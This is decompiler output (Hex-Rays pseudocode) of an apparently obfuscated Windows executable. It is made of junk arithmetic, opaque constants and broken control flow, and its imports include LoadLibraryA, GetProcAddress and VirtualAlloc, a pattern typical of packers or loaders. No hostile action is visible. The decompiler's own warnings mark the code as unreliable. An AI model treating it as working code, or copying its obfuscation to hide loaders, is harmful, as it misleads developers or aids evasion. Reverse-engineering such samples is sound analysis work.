/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __fastcall sub_41B7BD(unsigned int a1, unsigned int a2, int a3, int a4, int a5, int a6);
// void __usercall sub_41B965(int a1@<edx>, int a2@<ebp>);
void __fastcall sub_41BC41(int a1, int a2, int a3, int a4, int a5);
// void __userpurge start(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>, int a6, int a7, int a8);
int __thiscall sub_41C03B(void *this, int a2, int a3, int a4, int a5);
void __fastcall sub_41C238(int a1, int a2);
void sub_41D418();
// int __userpurge sub_41DAA0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4, int a5);
void __fastcall sub_41DB51(int a1, int a2, int a3, int a4, int a5);
int __thiscall sub_41DB85(void *this, int a2, int a3, int a4);
void __fastcall sub_41DF66(int a1, int a2);
// int __userpurge sub_41DFF6@<eax>(int result@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6);
// void __usercall sub_41E004(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>);
// int __userpurge sub_41E060@<eax>(int a1@<eax>, int a2@<ecx>, int a3, int a4, int a5, int a6);
// int __usercall sub_41E2AD@<eax>(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>);
int __stdcall sub_41E301(int a1, int a2);
// void __usercall sub_41EEC6(int a1@<edx>, int a2@<esi>);
// int __usercall sub_41F9BE@<eax>(int a1@<ecx>, int a2@<ebx>, int a3@<esi>, int a4);
// void __usercall sub_4200A4(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>);
unsigned int __cdecl sub_4201FE(_BYTE *a1);
_BYTE *__cdecl sub_4204DD(_BYTE *a1, _BYTE *a2);
unsigned __int8 __cdecl sub_420509(_BYTE *a1, unsigned int a2, int a3);
int sub_420814();
// _DWORD *__usercall sub_42099B@<eax>(_DWORD *result@<eax>, _BYTE *a2@<ecx>, int a3@<ebx>);
// __int64 (__stdcall *__usercall sub_420ACA@<eax>(int a1@<ecx>, int a2@<ebx>, int a3@<esi>))(_DWORD, _DWORD, _DWORD, _DWORD);
// int __usercall sub_420BE0@<eax>(int a1@<ecx>, int a2@<ebx>, int a3@<esi>);
_WORD *__fastcall sub_420EB4(int a1, int a2);
int __cdecl sub_421092(int a1, int a2, unsigned __int8 *a3);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// DWORD __stdcall GetCurrentProcessId();
// DWORD __stdcall GetCurrentThreadId();
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// void __stdcall GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime);
// void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_42261C; // weak
_UNKNOWN unk_42271C; // weak
int dword_44A004 = 0; // weak
int dword_44A008 = 0; // weak
int dword_44A00C = 0; // weak
int dword_44A010 = 0; // weak
int dword_44A014 = 0; // weak
int dword_44A018 = 0; // weak
int dword_44A01C = 0; // weak
int dword_44A020 = 0; // weak
int dword_44A024 = 0; // weak
int dword_44A028 = 0; // weak
int dword_44A02C = 0; // weak
int dword_44A030 = 0; // weak
int dword_44A034 = 0; // weak
int dword_44A038 = 0; // weak
int dword_44A03C = 0; // weak
int dword_44A040 = 0; // weak
int dword_44A044 = 0; // weak
int dword_44A048 = 0; // weak
int dword_44A04C = 0; // weak
int dword_44A050 = 0; // weak
int dword_44A248 = 0; // weak
char byte_44A264 = '\0'; // weak
char byte_44A3E0 = 'è'; // weak
char byte_44A4D0 = 'J'; // weak
char byte_44A604 = '\xFF'; // weak
int dword_44A614 = -384767807; // weak
int dword_44A644 = -561409979; // weak
int dword_44A6A0 = 212462016; // weak
char byte_44A778 = 'y'; // weak
int dword_44A8AC = 180868; // weak
int dword_44AA58 = 1151340573; // weak
int dword_44AAF0 = 1216938052; // weak
_UNKNOWN off_44AB1C; // weak
int dword_44ABF0 = -1914070802; // weak
int dword_44ACCC = 805634816; // weak
int dword_44ACEC = -1205138037; // weak
int dword_44ADD8 = -16759624; // weak
int dword_44AE88 = 1509967032; // weak
int dword_44B340 = 738215089; // weak
int dword_44B3A8 = 1962951863; // weak
char byte_44B400 = '\x14'; // weak
int dword_44B6BE = 0; // weak
_DWORD dword_44B6C2 = 0; // idb
int dword_44B6C6 = 285426; // weak
_UNKNOWN unk_44B6CA; // weak
_UNKNOWN unk_44B6D2; // weak
int dword_44B6DC = 0; // weak
int dword_44B6E0 = 0; // weak
_UNKNOWN unk_44B6EC; // weak
int dword_44B718 = 0; // weak
int (__stdcall *dword_44B7F3)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_44B807 = 0; // weak
int dword_44B80B = 0; // weak
int (__fastcall *dword_44B80F)(_DWORD, _DWORD) = NULL; // weak
int dword_44B813 = -1418624396; // weak
int dword_44B81B = 0; // weak
int dword_44B81F = 0; // weak
int dword_44B82F = 362436069; // weak
int (__stdcall *dword_44B837)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_44B83F = 88675123; // weak
int dword_44B843 = 521288629; // weak
int (__fastcall *dword_44B867)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
__int64 (__stdcall *dword_44B86B)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_44B873 = 0; // weak
int dword_44B9B0 = 0; // weak


//----- (0041B7BD) --------------------------------------------------------
int __fastcall sub_41B7BD(unsigned int a1, unsigned int a2, int a3, int a4, int a5, int a6)
{
  __int16 v6; // ax
  unsigned int v7; // edx
  unsigned int v8; // ecx
  int v9; // eax
  unsigned int v10; // edx
  unsigned int v11; // ecx
  int v13; // eax
  char v14; // cf
  unsigned int v15; // edx
  unsigned int v16; // ecx
  __int16 v17; // [esp+2DCh] [ebp-98h]

  v6 = v17;
  if ( (v17 & 0x143E) != 0 || v17 )
    v6 = (v17 - 11350) & 0x340D;
  v13 = sub_41E2AD(v6 & 0x49D, a2, a1);
  sub_41E2AD(v13 - (v14 + 2279), v15, v16);
  v9 = sub_41E2AD(0, v7, v8);
  return sub_41E2AD(v14 + v9 + 274, v10, v11);
}
// 41B7D0: variable 'v17' is possibly undefined
// 41C019: variable 'v14' is possibly undefined
// 41C01E: variable 'v15' is possibly undefined
// 41C01E: variable 'v16' is possibly undefined
// 41BBE3: variable 'v7' is possibly undefined
// 41BBE3: variable 'v8' is possibly undefined
// 41BBED: variable 'v10' is possibly undefined
// 41BBED: variable 'v11' is possibly undefined

//----- (0041B965) --------------------------------------------------------
void __usercall sub_41B965(int a1@<edx>, int a2@<ebp>)
{
  sub_41DAA0(a2 - 788, a1, 0, a2 - 788, 0);
  JUMPOUT(0x41DC24);
}
// 41B983: control flows out of bounds to 41DC24

//----- (0041BC41) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __fastcall sub_41BC41(int a1, int a2, int a3, int a4, int a5)
{
  int v5; // eax
  char v6; // cf
  unsigned int v7; // edx
  unsigned int v8; // ecx
  void *v9; // ecx
  unsigned int v10; // edx
  unsigned int v11; // ecx
  void *v12; // ecx
  unsigned int v13; // edx
  __int16 v14; // cx
  int v15; // eax
  int v16; // ecx
  int v17; // eax
  int v18; // eax
  int v19; // [esp-100h] [ebp-104h] BYREF
  _DWORD v20[5]; // [esp-B4h] [ebp-B8h] BYREF
  int v21; // [esp-A0h] [ebp-A4h]
  int v22; // [esp-34h] [ebp-38h]
  int v23; // [esp-Ch] [ebp-10h]
  _DWORD *v24; // [esp-8h] [ebp-Ch]
  int v25; // [esp-4h] [ebp-8h]

  sub_41DF66((int)&v19, a2);
  v25 = 0;
  v24 = v20;
  v23 = 49;
  sub_41D418();
  v17 = ((2 * v15) ^ 0x24D7) - 10370 + 5749;
  v21 += v17;
  v18 = v17 | 0x7CD;
  if ( (v14 & 0x136B) != 0 )
    v18 -= 6272;
  v25 = 0;
  v24 = v20;
  v23 = v20[2] | v18;
  v5 = sub_41B7BD((unsigned int)v20, v13, 0, v23, (int)v24, v25);
  sub_41E2AD(v6 + v5 + 4693, v7, v8);
  sub_41C03B(v9, 22, 49, 19, 1057969774);
  sub_41E2AD(12010, v10, v11);
  sub_41C03B(v12, 15, 35, 7, 186023180);
  if ( v22 != v16 )
    JUMPOUT(0x41DC7A);
  JUMPOUT(0x41D6A5);
}
// 41C09C: control flows out of bounds to 41DC7A
// 41C075: control flows out of bounds to 41D6A5
// 41D8C4: conditional instruction was optimized away because of 'eax.4>=7CDu'
// 41BDBC: bad sp value at call
// 41BFA0: variable 'v15' is possibly undefined
// 41BDBC: variable 'v13' is possibly undefined
// 41BDC1: variable 'v6' is possibly undefined
// 41BDCB: variable 'v7' is possibly undefined
// 41BDCB: variable 'v8' is possibly undefined
// 41BDDB: variable 'v9' is possibly undefined
// 41BDEE: variable 'v10' is possibly undefined
// 41BDEE: variable 'v11' is possibly undefined
// 41BE04: variable 'v12' is possibly undefined
// 41C075: variable 'v16' is possibly undefined
// 41E9D1: variable 'v14' is possibly undefined

//----- (0041BF15) --------------------------------------------------------
void __userpurge start(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>, int a6, int a7, int a8)
{
  int v8; // eax
  unsigned int v9; // edx
  unsigned int v10; // ecx
  int v11; // edx
  int v12; // ecx
  int v13; // eax
  unsigned int v14; // edx
  unsigned int v15; // ecx
  int v16; // eax
  void (__stdcall **v17)(LPFILETIME); // eax
  int v18; // edx
  int v19; // edx
  int v20; // ecx
  __int16 v21; // ax
  int v22; // ecx
  int v23; // edx
  unsigned int v24; // ecx
  int v25; // eax
  int v26; // edx
  int v27; // ecx
  int v28; // edx
  int v29; // ecx
  unsigned int v30; // eax
  _DWORD *v31; // ecx
  int v32; // edx
  int v33; // eax
  int v34; // ecx
  int v35; // edx
  unsigned int v36; // edx
  unsigned int v37; // ecx
  void *v38; // ecx
  int v39; // edx
  int v40; // ecx
  int v41; // edx
  int v42; // ecx
  bool v43; // cf
  int v44; // ecx
  int v45; // ecx
  int v46; // eax
  void *v47; // ecx
  int v48; // eax
  unsigned int v49; // edx
  unsigned int v50; // ecx
  void *v51; // ecx
  int v52; // eax
  unsigned int v53; // edx
  unsigned int v54; // ecx
  int v55; // eax
  unsigned int v56; // edx
  unsigned int v57; // ecx
  int v58; // eax
  unsigned int v59; // edx
  unsigned int v60; // ecx
  int v61; // [esp+20h] [ebp-250h]
  int v62; // [esp+30h] [ebp-240h]
  char v63[12]; // [esp+4Ch] [ebp-224h] BYREF
  int v64[6]; // [esp+60h] [ebp-210h] BYREF
  char v65[4]; // [esp+78h] [ebp-1F8h] BYREF
  char v66[20]; // [esp+7Ch] [ebp-1F4h] BYREF
  int v67; // [esp+94h] [ebp-1DCh]
  int v68; // [esp+98h] [ebp-1D8h]
  char v69[24]; // [esp+A0h] [ebp-1D0h] BYREF
  char v70[12]; // [esp+B8h] [ebp-1B8h] BYREF
  char v71[16]; // [esp+F0h] [ebp-180h] BYREF
  unsigned int v72; // [esp+100h] [ebp-170h]
  char v73[72]; // [esp+128h] [ebp-148h] BYREF
  int v74; // [esp+170h] [ebp-100h]
  int v75; // [esp+17Ch] [ebp-F4h]
  int v76; // [esp+184h] [ebp-ECh]
  char v77[12]; // [esp+18Ch] [ebp-E4h] BYREF
  int v78; // [esp+1A4h] [ebp-CCh]
  char v79[28]; // [esp+1D4h] [ebp-9Ch] BYREF
  int v80; // [esp+1F0h] [ebp-80h]
  unsigned int v81; // [esp+1FCh] [ebp-74h]
  int savedregs; // [esp+270h] [ebp+0h] BYREF

  LOBYTE(dword_44A048) = 14;
  dword_44B6DC = a4;
  dword_44B873 = a1;
  v43 = (unsigned __int8)dword_44A004 < 0x36u;
  LOBYTE(dword_44A004) = dword_44A004 - 54;
  v23 = dword_44ADD8;
  dword_44B81F = a5;
  BYTE1(v23) = 7;
  dword_44A020 += a5;
  dword_44A00C = a3;
  v17 = &GetSystemTimeAsFileTime;
  dword_44A014 = 18475;
  BYTE1(v17) = byte_44A3E0;
  LOBYTE(dword_44A03C) = -43;
  unk_44B6CA = a2;
  v30 = (unsigned int)v17 - __CFADD__(dword_44AE88, v43 + v23 + 26762 - dword_44B3A8) - 35703;
  v31 = &dword_44B6C2;
  v32 = (16 * dword_44A614) ^ 0x26EA;
  dword_44A028 = 27217 - v30;
  dword_44B6C2 = a3;
  LOBYTE(v32) = (__CFADD__(v30 > 0x6A51, dword_44ABF0 + 3589) | __CFADD__((v30 > 0x6A51) + dword_44ABF0 + 3589, 23815))
              + v32
              - 107;
  LOBYTE(dword_44A030) = dword_44A030 - 101;
  BYTE1(v32) -= byte_44B400;
  BYTE1(v31) = byte_44A264;
  sub_41B7BD((unsigned int)v31, v32, 0, v32, (int)v71, 0);
  sub_41BC41(v27, v26, 0, v64[0], (int)&savedregs);
  sub_41D418();
  sub_41DB51(v29, v28, 1826603036, 0, v28);
  sub_41DF66(v34, (int)v69);
  sub_41DAA0((int)v64, v35, 0, (int)v64, 0);
  v55 = ((v72 | 0xFFFFC59C00000000ui64) - 0x65BFFFFC59Ci64) >> 32;
  v72 += 14948;
  if ( !v37 )
    v55 += 10357;
  sub_41E2AD(v55, v36, v37);
  v46 = sub_41E060(0, v45, (int)v79, 0, 62, 39);
  v8 = sub_41DFF6(v46, (__int16)v63, -201547418, v68, (int)v63, 0);
  sub_41E2AD((v8 ^ 0x979) + 13044, v9, v10);
  sub_41DB85(v65, v18, (int)v65, 1487245906);
  sub_41E301(14, v19);
  sub_41DF66(v20, (int)v64);
  if ( (v21 & 0x1C40) == 0 && !v22 && v81 <= 0x1B0D )
  {
    v16 = 6925 - v74 - 681;
    if ( v16 >= 0 )
      v68 &= v16 + 6793 - ((((unsigned int)v16 | 0x3D2F00000000ui64) + 6793) >> 32);
  }
  sub_41D418();
  sub_41C238(v12, v11);
  sub_41E2AD(v13, v14, v15);
  sub_41D418();
  v25 = sub_41B7BD(v24, 0, 0, v64[1], (int)v73, 0);
  v58 = sub_41E2AD((2 * v25 - (__CFADD__(v25, v25) + 10913)) ^ 0x15FE, v56, v57);
  sub_41E2AD((v58 ^ 0x12B6) - 2264, v59, v60);
  sub_41DFF6((int)v70, 0, 0, v75, (int)v70, 0);
  sub_41DFF6((int)v66, 0, v80, -755130372, (int)v66, 0);
  v48 = sub_41C03B(v47, 50, 19, 43, 268027333);
  sub_41E004(v48, v49, v50);
  v52 = sub_41C03B(v51, 53, 29, 9, v67);
  sub_41E2AD(v52 - 5245, v53, v54);
  sub_41C03B(v38, 50, 30, 51, v61);
  sub_41D418();
  sub_41DB51(v40, v39, -1678662331, 0, v78);
  sub_41BC41(v42, v41, 0, v42, 47);
  v33 = (((unsigned int)-v43 < 0x1AE) + -v43 - 430 + 2915) ^ 0x81A;
  if ( v62 == v44 )
  {
    if ( v33 )
      goto LABEL_13;
    v33 = -5749;
  }
  v76 ^= v33;
LABEL_13:
  sub_41B7BD((unsigned int)v77, 0, 0, 0, (int)v77, 0);
  JUMPOUT(0x41DCC5);
}
// 41C252: control flows out of bounds to 41DCC5
// 41CE11: variable 'v27' is possibly undefined
// 41CE11: variable 'v26' is possibly undefined
// 41CFE3: variable 'v29' is possibly undefined
// 41CFE3: variable 'v28' is possibly undefined
// 41DD21: variable 'v34' is possibly undefined
// 41DD36: variable 'v35' is possibly undefined
// 41C84C: variable 'v36' is possibly undefined
// 41C84C: variable 'v37' is possibly undefined
// 41E260: variable 'v45' is possibly undefined
// 41C00A: variable 'v9' is possibly undefined
// 41C00A: variable 'v10' is possibly undefined
// 41CC38: variable 'v18' is possibly undefined
// 41CC40: variable 'v19' is possibly undefined
// 41CC4E: variable 'v20' is possibly undefined
// 41C898: variable 'v22' is possibly undefined
// 41C7FE: variable 'v12' is possibly undefined
// 41C7FE: variable 'v11' is possibly undefined
// 41C803: variable 'v13' is possibly undefined
// 41C803: variable 'v14' is possibly undefined
// 41C803: variable 'v15' is possibly undefined
// 41CD7C: variable 'v24' is possibly undefined
// 41E9E8: variable 'v56' is possibly undefined
// 41E9E8: variable 'v57' is possibly undefined
// 41E9F9: variable 'v59' is possibly undefined
// 41E9F9: variable 'v60' is possibly undefined
// 41E386: variable 'v47' is possibly undefined
// 41E390: variable 'v49' is possibly undefined
// 41E390: variable 'v50' is possibly undefined
// 41E3A1: variable 'v51' is possibly undefined
// 41E3AB: variable 'v53' is possibly undefined
// 41E3AB: variable 'v54' is possibly undefined
// 41DE2E: variable 'v38' is possibly undefined
// 41DE2E: variable 'v61' is possibly undefined
// 41DE52: variable 'v40' is possibly undefined
// 41DE52: variable 'v39' is possibly undefined
// 41DE64: variable 'v42' is possibly undefined
// 41DE64: variable 'v41' is possibly undefined
// 41CC53: variable 'v21' is possibly undefined
// 41DE69: variable 'v43' is possibly undefined
// 41DB23: variable 'v62' is possibly undefined
// 41DB23: variable 'v44' is possibly undefined
// 44A004: using guessed type int dword_44A004;
// 44A00C: using guessed type int dword_44A00C;
// 44A014: using guessed type int dword_44A014;
// 44A020: using guessed type int dword_44A020;
// 44A028: using guessed type int dword_44A028;
// 44A030: using guessed type int dword_44A030;
// 44A03C: using guessed type int dword_44A03C;
// 44A048: using guessed type int dword_44A048;
// 44A264: using guessed type char byte_44A264;
// 44A3E0: using guessed type char byte_44A3E0;
// 44A614: using guessed type int dword_44A614;
// 44ABF0: using guessed type int dword_44ABF0;
// 44ADD8: using guessed type int dword_44ADD8;
// 44AE88: using guessed type int dword_44AE88;
// 44B3A8: using guessed type int dword_44B3A8;
// 44B400: using guessed type char byte_44B400;
// 44B6DC: using guessed type int dword_44B6DC;
// 44B81F: using guessed type int dword_44B81F;
// 44B873: using guessed type int dword_44B873;

//----- (0041C03B) --------------------------------------------------------
int __thiscall sub_41C03B(void *this, int a2, int a3, int a4, int a5)
{
  int v5; // ecx
  unsigned int v6; // ecx
  int v7; // eax
  __int16 v9; // ax
  unsigned int v10; // eax
  bool v11; // cf
  unsigned int v12; // eax
  __int16 v13; // dx
  int v14; // ecx
  __int16 v15; // ax
  int v16; // eax
  char v17[12]; // [esp+24h] [ebp-1DCh] BYREF
  char v18[8]; // [esp+30h] [ebp-1D0h] BYREF
  char v19[76]; // [esp+38h] [ebp-1C8h] BYREF
  int v20; // [esp+84h] [ebp-17Ch]
  int v21; // [esp+9Ch] [ebp-164h]
  int v22; // [esp+118h] [ebp-E8h]
  char v23[16]; // [esp+164h] [ebp-9Ch] BYREF
  char v24[16]; // [esp+174h] [ebp-8Ch] BYREF
  int v25; // [esp+198h] [ebp-68h]
  int v26; // [esp+1B8h] [ebp-48h]

  sub_41DF66((int)this, (int)v24);
  v10 = v22 ^ ((v15 & 0x1E50) + 15102);
  v11 = v10 < 0xA73;
  v12 = v10 - 2675;
  v16 = v11 + v12 + 6407;
  if ( v14 || (v13 & 0x903) == 0 )
    v21 -= v16;
  v9 = sub_41B7BD((unsigned int)v17, 0, 0, v20, (int)v17, 0);
  v25 += (v9 - (v11 + 11666)) & 0x26C | 0x25B6;
  sub_41DF66(v5, (int)v18);
  sub_41B7BD(0, (unsigned int)v23, 0, v26, (int)v23, 0);
  v7 = sub_41B7BD(v6, 0, 0, -656810509, (int)v19, 0);
  return v11 + v7 + 8320;
}
// 41E08E: variable 'v15' is possibly undefined
// 41C294: variable 'v11' is possibly undefined
// 41BC7C: variable 'v5' is possibly undefined
// 41BD61: variable 'v6' is possibly undefined
// 41C3CF: variable 'v13' is possibly undefined
// 41E22D: variable 'v14' is possibly undefined

//----- (0041C238) --------------------------------------------------------
void __fastcall sub_41C238(int a1, int a2)
{
  int v2; // ecx
  unsigned int v3; // ecx
  int v4; // ecx
  int v5[105]; // [esp-21Ch] [ebp-220h] BYREF
  _DWORD v6[31]; // [esp-78h] [ebp-7Ch] BYREF

  sub_41DF66((int)v5, a2);
  sub_41E301(10, v5[44]);
  sub_41E301(1, v2);
  sub_41B7BD(v3, 0, 0, (int)v6, (int)v6, 0);
  sub_41DF66(v4, (int)v6);
  sub_41E301(9, 2136167811);
  sub_420814();
  v6[29] = 1203005452;
  JUMPOUT(0x41E183);
}
// 41E59D: control flows out of bounds to 41E183
// 41B8CE: variable 'v2' is possibly undefined
// 41BA51: variable 'v3' is possibly undefined
// 41C85C: variable 'v4' is possibly undefined

//----- (0041D418) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void sub_41D418()
{
  int v0; // edx
  void *v1; // ecx
  int v2; // edx
  unsigned int v3; // ecx
  int v4; // edx
  void *v5; // ecx
  void *v6; // ecx
  void *v7; // ecx
  int v8; // eax
  int v9; // edx
  unsigned int v10; // ecx
  int v11; // ecx
  int v12; // ecx
  int v13; // eax
  unsigned int v14; // edx
  unsigned int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // ecx
  _DWORD v19[26]; // [esp-264h] [ebp-268h] BYREF
  int v20[30]; // [esp-1FCh] [ebp-200h] BYREF
  _BYTE v21[28]; // [esp-184h] [ebp-188h] BYREF
  int v22; // [esp-168h] [ebp-16Ch]
  _DWORD v23[62]; // [esp-164h] [ebp-168h] BYREF
  _BYTE v24[12]; // [esp-6Ch] [ebp-70h] BYREF
  _BYTE v25[12]; // [esp-60h] [ebp-64h] BYREF
  _DWORD v26[22]; // [esp-54h] [ebp-58h] BYREF

  sub_41E301(57, v22);
  sub_41C03B(v6, 17, 53, 44, (int)v6);
  GetCurrentThreadId();
  sub_41C03B(v7, 2, 30, 35, (int)v7);
  v8 = sub_41E301(23, v20[13]) & 0x695;
  sub_41B7BD(v3, (unsigned int)v21, 0, (v8 ^ 0x1A26) - 15167, (int)v21, 0);
  GetCurrentThreadId();
  sub_41DAA0(0, v4, (int)v19, (int)v19, 0);
  sub_41C03B(v5, 26, 26, 35, v20[9]);
  sub_41C03B(v1, 35, 35, 24, v0);
  sub_41DF66((int)v25, v9);
  GetCurrentThreadId();
  sub_41B7BD(v10, (unsigned int)v26, 0, (int)v26, (int)v26, 0);
  GetCurrentProcessId();
  sub_41E301(20, v11);
  v26[21] = v20;
  v26[20] = 56;
  sub_41DF66(v12, (int)v20);
  v16 = sub_41E2AD(v23[24] | v19[19] | v13, v14, v15);
  v22 |= v16;
  sub_41E060((int)v24, v17, (int)v24, 0, 41, 47);
  if ( !v2 || v20[19] != v18 || v19[1] < (unsigned int)v25[4] - 6461 )
  {
    sub_41E060(0, v18, (int)v23, 0, 2, 8);
    JUMPOUT(0x41C567);
  }
  JUMPOUT(0x41DCE4);
}
// 41D02A: control flows out of bounds to 41DCE4
// 41D7B0: control flows out of bounds to 41C567
// 41DE91: bad sp value at call
// 41E0AD: bad sp value at call
// 41E0DB: bad sp value at call
// 41D783: bad sp value at call
// 41D6B0: variable 'v6' is possibly undefined
// 41D6D1: variable 'v7' is possibly undefined
// 41D248: variable 'v3' is possibly undefined
// 41D26C: variable 'v4' is possibly undefined
// 41D282: variable 'v5' is possibly undefined
// 41C3A8: variable 'v1' is possibly undefined
// 41C3A8: variable 'v0' is possibly undefined
// 41DD4C: variable 'v9' is possibly undefined
// 41DE91: variable 'v10' is possibly undefined
// 41DE9F: variable 'v11' is possibly undefined
// 41E0AD: variable 'v12' is possibly undefined
// 41E0B2: variable 'v13' is possibly undefined
// 41E0BE: variable 'v14' is possibly undefined
// 41E0BE: variable 'v15' is possibly undefined
// 41E0DB: variable 'v17' is possibly undefined
// 41C468: variable 'v2' is possibly undefined
// 41D000: variable 'v18' is possibly undefined

//----- (0041DAA0) --------------------------------------------------------
int __userpurge sub_41DAA0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4, int a5)
{
  bool v6; // cf
  int v7; // eax
  int v8; // eax
  int v9; // [esp+118h] [ebp-F8h]
  int v10; // [esp+17Ch] [ebp-94h]

  v8 = v10 + __CFADD__(a1 + 35633, a1 + 35633) + 2 * (a1 + 35633) + 4349;
  if ( a3 )
    goto LABEL_4;
  v6 = 0;
  if ( (v8 & a2) == 0 )
  {
    v8 = -v9;
LABEL_4:
    v7 = v8 & 0x3C2;
    v6 = __CFADD__(v7, 14781);
    v8 = v7 + 14781;
  }
  return (v8 - (v6 + 10039)) ^ 0x3FDF | 0x323C;
}
// 41E665: variable 'v10' is possibly undefined
// 41C874: variable 'v9' is possibly undefined

//----- (0041DB51) --------------------------------------------------------
void __fastcall sub_41DB51(int a1, int a2, int a3, int a4, int a5)
{
  int v5; // eax
  int v6; // edx
  int v7; // ecx
  unsigned int v8; // edx
  unsigned int v9; // ecx
  __int16 v10; // ax
  bool v11; // cf
  int v12; // edx
  unsigned int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // ecx
  int v17; // ecx
  unsigned int v18; // eax
  int v19; // [esp+0h] [ebp-294h]
  int v20; // [esp+44h] [ebp-250h]
  int v21; // [esp+68h] [ebp-22Ch]
  char v22[44]; // [esp+84h] [ebp-210h] BYREF
  char v23[4]; // [esp+B0h] [ebp-1E4h] BYREF
  char v24[52]; // [esp+B4h] [ebp-1E0h] BYREF
  char v25[172]; // [esp+E8h] [ebp-1ACh] BYREF
  char v26[16]; // [esp+194h] [ebp-100h] BYREF
  char v27[60]; // [esp+1A4h] [ebp-F0h] BYREF
  unsigned int v28; // [esp+1E0h] [ebp-B4h]
  int v29; // [esp+204h] [ebp-90h]
  unsigned __int8 v30; // [esp+25Ch] [ebp-38h]

  sub_41BC41(0, a2, 0, v21, v19);
  sub_41DAA0(0, v12, (int)v22, (int)v22, 0);
  sub_41E060(v30 ^ 0x3325, v17, (int)v23, 0, 24, 8);
  sub_41DAA0((int)v25, v6, v7, (int)v25, 0);
  v10 = 5365;
  v11 = v9 < v8;
  if ( v9 < v8 )
    goto LABEL_4;
  LOWORD(v18) = 12701;
  if ( v9 != v28 )
    goto LABEL_10;
  v18 = (v9 < v28) + 14594;
  if ( v18 > v9 )
    goto LABEL_5;
  v14 = 0;
  if ( (v9 & 0x3A19) != 0 )
    goto LABEL_13;
  v15 = 8467;
  if ( v20 == v8 )
  {
    v10 = 7343;
    v11 = 0;
LABEL_4:
    v13 = ((((v10 + v11 + v10) & 0xAFE) + 16339) | 0x2896) - v29;
    v18 = ((__PAIR64__(v13 - 15369, v13) - 0xCB00003C09i64) >> 32) - 10806;
LABEL_10:
    LOWORD(v18) = v18 | 0x1AC1;
LABEL_5:
    v14 = v18 & 0x33AB;
LABEL_13:
    v15 = ((v14 | 0x1E16) ^ 0x1422) - 7759;
  }
  v5 = sub_41DAA0(v15, (int)v24, v9, (int)v24, 0);
  sub_41E060(v5, (int)v27, (int)v27, 0, 35, 53);
  sub_41DF66(v16, (int)v26);
}
// 41C258: variable 'v21' is possibly undefined
// 41C258: variable 'v19' is possibly undefined
// 41B78B: variable 'v9' is possibly undefined
// 41DD88: variable 'v16' is possibly undefined
// 41BC62: variable 'v12' is possibly undefined
// 41E34B: variable 'v17' is possibly undefined
// 41B991: variable 'v6' is possibly undefined
// 41B991: variable 'v7' is possibly undefined
// 41C197: variable 'v8' is possibly undefined
// 41D053: variable 'v20' is possibly undefined

//----- (0041DB85) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
// positive sp value has been detected, the output may be wrong!
int __thiscall sub_41DB85(void *this, int a2, int a3, int a4)
{
  int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // ecx
  __int16 v7; // dx
  __int16 v8; // ax
  int result; // eax
  int v10; // edx
  int v11; // eax
  unsigned int v12; // edx
  unsigned int v13; // ecx
  int v14; // ecx
  unsigned int v15; // eax
  int v16; // edx
  bool v17; // cf
  unsigned int v18; // eax
  unsigned int v19; // edx
  int v20; // ecx
  unsigned __int16 v21; // [esp-21Ch] [ebp-220h]
  int v22; // [esp-1ECh] [ebp-1F0h]
  int v23; // [esp-17Ch] [ebp-180h] BYREF
  _BYTE v24[12]; // [esp-178h] [ebp-17Ch] BYREF
  _BYTE v25[16]; // [esp-16Ch] [ebp-170h] BYREF
  int v26; // [esp-15Ch] [ebp-160h]
  int v27; // [esp-FCh] [ebp-100h]
  int v28; // [esp-DCh] [ebp-E0h] BYREF
  _BYTE v29[108]; // [esp-A0h] [ebp-A4h] BYREF
  int v30; // [esp-34h] [ebp-38h]
  int v31; // [esp-14h] [ebp-18h]
  int v32; // [esp-10h] [ebp-14h]
  int *v33; // [esp-Ch] [ebp-10h]
  int v34; // [esp-8h] [ebp-Ch]

  sub_41C03B(this, 32, 49, 49, 465181835);
  sub_41B7BD((unsigned int)v24, 0, 0, v27, (int)v24, 0);
  if ( v19 == v20 && !v19 )
    v26 ^= v29[36] & 0x70;
  v11 = sub_41B7BD((unsigned int)v24, v19, 0, -2084630040, (int)v24, 0);
  sub_41E2AD(v11 | 0x2161, v12, v13);
  v15 = sub_41E301(30, v14);
  v17 = v15 < 0x2F3B;
  v18 = v15 - 12091;
